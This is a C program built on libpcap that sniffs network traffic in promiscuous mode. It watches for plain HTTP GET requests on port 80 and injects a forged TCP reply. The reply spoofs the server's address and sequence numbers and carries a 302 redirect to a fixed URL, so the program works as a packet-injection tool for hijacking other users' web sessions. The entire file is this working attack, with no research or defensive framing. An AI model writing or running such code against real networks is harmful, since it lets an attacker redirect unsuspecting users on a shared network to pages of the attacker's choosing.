#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in_systm.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pcap/pcap.h>

#define MIN_PKT_SZ (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr))

char payload[] = "HTTP/1.1 302 Found\r\n"
		"Location: http://www.example.com/\r\n"
		"\r\n";

struct simple_packet {
	struct ether_header eth_hdr;
	struct iphdr ip_hdr;
	struct tcphdr tcp_hdr;
	uint8_t payload[sizeof(payload) - 1];
};


void calc_tcp_chksum (const struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, size_t tcp_len, const void *data, size_t data_len) {
	uint32_t chksum;
	const uint16_t *dataptr;

	chksum = (ip_hdr->saddr >> 16) + (ip_hdr->saddr & 0xffff)
		+ (ip_hdr->daddr >> 16) + (ip_hdr->daddr & 0xffff)
		+ ip_hdr->protocol + htons(ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4));
	chksum = (chksum >> 16) + (chksum & 0xffff);
	chksum = (chksum >> 16) + (chksum & 0xffff);

	tcp_hdr->th_sum = htons(0);

	dataptr = (const uint16_t *) tcp_hdr;
	while (tcp_len > 1) {
		chksum += *dataptr++;
		tcp_len -= 2;
		chksum = (chksum >> 16) + (chksum & 0xffff);
		chksum = (chksum >> 16) + (chksum & 0xffff);
	}
	chksum -= tcp_hdr->th_sum;
	if (tcp_len == 1) chksum += *((const uint8_t *)dataptr);
	
	dataptr = (const uint16_t *) data;
	while (data_len > 1) {
		chksum += *dataptr++;
		data_len -= 2;
		chksum = (chksum >> 16) + (chksum & 0xffff);
		chksum = (chksum >> 16) + (chksum & 0xffff);
	}
	if (data_len == 1) chksum += *((const uint8_t *)dataptr);
	
	chksum = (chksum >> 16) + (chksum & 0xffff);
	tcp_hdr->th_sum = htons((~((chksum >> 16) + (chksum & 0xffff))) & 0xffff);
}

void calc_ip_chksum (struct iphdr *ip_hdr, size_t ip_len) {
	uint32_t chksum = 0;
	const uint16_t *dataptr;

	ip_hdr->check = htons(0);
	dataptr = (const uint16_t *)ip_hdr;
	while (ip_len > 1) {
		chksum += *dataptr++;
		ip_len -= 2; 
		chksum = (chksum >> 16) + (chksum & 0xffff);
		chksum = (chksum >> 16) + (chksum & 0xffff);
	}
	if (ip_len == 1) chksum += *((const uint8_t *)dataptr);
	chksum = (chksum >> 16) + (chksum & 0xffff);
	ip_hdr->check = htons((~((chksum >> 16) + (chksum & 0xffff))) & 0xffff);
}

void packet_handler (u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
	const struct ether_header *eth_hdr = (const struct ether_header *) bytes;
	pcap_t *p_hl = (pcap_t *)user;
	if (h->caplen < MIN_PKT_SZ || ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) return;

	const struct iphdr *ip_hdr = (const struct iphdr *)(((const uint8_t *)eth_hdr) + sizeof(struct ether_header));
	const size_t ip_hdr_sz = ((size_t)ip_hdr->ihl) * 4L;
	if (ip_hdr->version != 4 || ip_hdr_sz < sizeof(struct iphdr) || ip_hdr->protocol != IPPROTO_TCP) return;

	// total pkt len chk
	if (ntohs(ip_hdr->tot_len) < (ip_hdr_sz + sizeof(struct tcphdr))) return;

	const size_t total_pkt_sz = sizeof(struct ether_header) + (size_t)ntohs(ip_hdr->tot_len);
	if (h->caplen < total_pkt_sz) return;

	const struct tcphdr *tcp_hdr = (const struct tcphdr *)(((const uint8_t *)ip_hdr) + ip_hdr_sz);
	const size_t tcp_hdr_sz = (size_t)(tcp_hdr->th_off) * 4L;
	if (total_pkt_sz < (sizeof(struct ether_header) + ip_hdr_sz + tcp_hdr_sz)) return;

	const uint8_t *app_data = ((const uint8_t *)tcp_hdr) + tcp_hdr_sz;
	const size_t app_sz = ((size_t)ip_hdr->tot_len) - ip_hdr_sz - tcp_hdr_sz;

	/** Begin app processing **/

	// ACK, !SYN, !FIN, !RST, dst port 80
	if (!(tcp_hdr->th_flags & TH_ACK)) return;
	if (tcp_hdr->th_flags & TH_SYN) return;
	if (tcp_hdr->th_flags & TH_FIN) return;
	if (tcp_hdr->th_flags & TH_RST) return;
	if (ntohs(tcp_hdr->th_dport) != 80) return;
	if (ntohl(ip_hdr->daddr) == 3232243746) return;
	printf("Daddr: %#x, Sport: %u Dport: %u Seq: %u Ack: %u APP\n", ntohl(ip_hdr->daddr), ntohs(tcp_hdr->th_sport), ntohs(tcp_hdr->th_dport), ntohl(tcp_hdr->th_seq), ntohl(tcp_hdr->th_ack));
	
	if (app_sz > 4 && memcmp(app_data, "GET ", 4) == 0) {
		struct simple_packet mypkt;
		// To client
		// Ethernet header
		memcpy(mypkt.eth_hdr.ether_shost, eth_hdr->ether_dhost, ETHER_ADDR_LEN);
		memcpy(mypkt.eth_hdr.ether_dhost, eth_hdr->ether_shost, ETHER_ADDR_LEN);
		mypkt.eth_hdr.ether_type = htons(ETHERTYPE_IP);

		// IPv4 header
		mypkt.ip_hdr.ihl = 5;
		mypkt.ip_hdr.version = 4;
		mypkt.ip_hdr.tos = ip_hdr->tos;
		mypkt.ip_hdr.tot_len = htons(sizeof(struct simple_packet) - sizeof(struct ether_header));
		mypkt.ip_hdr.id = htons(0);
		mypkt.ip_hdr.frag_off = htons(0);
		mypkt.ip_hdr.ttl = ip_hdr->ttl;
		mypkt.ip_hdr.protocol = IPPROTO_TCP;
		mypkt.ip_hdr.saddr = ip_hdr->daddr;
		mypkt.ip_hdr.daddr = ip_hdr->saddr;

		// TCP header
		mypkt.tcp_hdr.th_sport = tcp_hdr->th_dport;
		mypkt.tcp_hdr.th_dport = tcp_hdr->th_sport;
		mypkt.tcp_hdr.th_seq = tcp_hdr->th_ack;
		mypkt.tcp_hdr.th_ack = htonl(ntohl(tcp_hdr->th_seq) + app_sz);
		mypkt.tcp_hdr.th_off = 5;
		mypkt.tcp_hdr.th_flags = TH_ACK | TH_PUSH | TH_FIN;
		mypkt.tcp_hdr.th_win = htons(16);
		mypkt.tcp_hdr.th_urp = 0;

		// Payload
		memcpy(mypkt.payload, payload, sizeof(payload) - 1);

		// Calculate TCP checksum
		calc_ip_chksum(&mypkt.ip_hdr, sizeof(struct iphdr));
		calc_tcp_chksum(&mypkt.ip_hdr, &mypkt.tcp_hdr, sizeof(struct tcphdr), mypkt.payload, sizeof(payload) - 1);
		// Inject
		if (pcap_inject(p_hl, &mypkt, sizeof(mypkt)) < 0) {
			puts("warning: inject failure");
		} else {
			puts("success");
		}
	}
}

int main (int argc, char **argv) {
	pcap_t *p_hl;
	char errbuf[PCAP_ERRBUF_SIZE];
	const char *dev;
	int err;
	struct bpf_program prog;

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "%s: pcap_lookupdev: %s\n", argv[0], errbuf);
		return EXIT_FAILURE;
	}

	p_hl = pcap_open_live(dev, 65536, 1, 1, errbuf);
	if (p_hl == NULL) {
		fprintf(stderr, "%s: pcap_create: %s\n", argv[0], errbuf);
		return EXIT_FAILURE;
	}

/*
	if (pcap_compile(p_hl, &prog, "tcp port 80", 1, PCAP_NETMASK_UNKNOWN) != 0) {
		pcap_perror(p_hl, argv[0]);
		pcap_close(p_hl);
		return EXIT_FAILURE;
	}

	if (pcap_setfilter(p_hl, &prog) < 0) {
		pcap_perror(p_hl, argv[0]);
		pcap_freecode(&prog);
		pcap_close(p_hl);
		return EXIT_FAILURE;
	}
// */

	err = pcap_loop(p_hl, -1, &packet_handler, (u_char *)p_hl);

	if (err == -1) {
		pcap_perror(p_hl, argv[0]);
	}
	pcap_freecode(&prog);
	pcap_close(p_hl);

	return err < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
